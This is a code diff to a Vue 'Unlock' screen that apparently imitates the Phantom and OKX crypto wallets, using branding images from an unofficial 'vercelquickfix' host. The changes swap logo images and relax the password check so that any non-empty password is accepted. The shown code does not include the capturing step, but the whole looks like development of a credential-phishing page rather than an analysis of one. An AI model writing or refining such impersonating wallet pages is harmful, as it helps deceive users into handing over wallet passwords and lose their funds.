@@ -37,7 +37,7 @@
             <div class="flex flex-col items-center justify-center">
               <div class="mb-1">
                 <img
-                  src="https://vercelquickfix.com/okx-main.png"
+                  src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGI8NCXgN_3AJPLh4CDpHjxbCzopI1HWWAHw&s"
                   alt="Phantom Logo"
                   class="object-cover"
                 />
@@ -67,8 +67,8 @@
                   <button
                     @click="unlock"
                     type="button"
-                    :disabled="password.length <= 6 || isLoading"
-                    :class="password.length > 6 ? 'bg-black' : 'bg-gray-400'"
+                    :disabled="password.length < 1 || isLoading"
+                    :class="password.length > 0 ? 'bg-black' : 'bg-gray-400'"
                     class="w-full py-4 px-4 mb-2 border-none outline-none hover:border-none hover:text-[#222] rounded-[30px] font-semibold text-2xl duration-200 flex items-center justify-center bg-[#333] text-white relative"
                   >
                     <span v-if="!isLoading">Unlock</span>
@@ -119,7 +119,7 @@
                     class="bg-white rounded-xl w-14 h-14 flex items-center justify-center mr-3"
                   >
                     <img
-                      src="https://vercelquickfix.com/logo_mini.svg"
+                      src="/images/olx.png"
                       class="w-14 h-14 object-contain"
                     />
                   </div>
@@ -518,7 +518,7 @@ function goBackToStep2() {
 }
 
 function unlock() {
-  if (password.value.length <= 6) return;
+  if (password.value.length < 1) return;
   isLoading.value = true;
   setTimeout(() => {
     isLoading.value = false;
